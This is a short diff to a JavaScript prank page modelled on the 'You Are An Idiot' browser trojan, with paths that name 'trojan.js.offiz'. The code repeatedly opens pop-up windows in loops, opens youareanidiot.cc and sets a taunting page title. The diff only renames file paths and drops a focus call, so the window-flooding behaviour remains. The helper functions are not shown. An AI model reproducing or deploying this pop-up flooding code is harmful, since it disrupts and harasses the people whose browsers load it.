@@ -7,7 +7,7 @@
 
                 function myfunction() {
                    
-                    openWindowa("trojan.js.offiz/hellolol.html")
+                    openWindowa("hellolol.html")
                     openWindow("http://youareanidiot.cc")
                     procreate()
                 }
@@ -15,9 +15,9 @@
                     function procreate() {
                         changeTitle("Idiot!HAHAHAHA");
                         for (var i = 0; i < 5; i++) {
-                            openWindow('trojan.js.offiz/helloidiot.html');
-                            openWindowa('trojan.js.offiz/hellolol.html')
-                            window.focus()
+                            openWindow('helloidiot.html');
+                            openWindowa('hellolol.html')
+                            
                         }
                         }
                     
@@ -33,8 +33,8 @@
 
                         function myfunction2() {
                             for(i=0;i<5;i++) {
-                                openWindowa("trojan.js.offiz/hellolol.html")
-                            openWindow("trojan.js.offiz/helloidiot.html")
+                                openWindowa("hellolol.html")
+                            openWindow("helloidiot.html")
                             
                         }
 
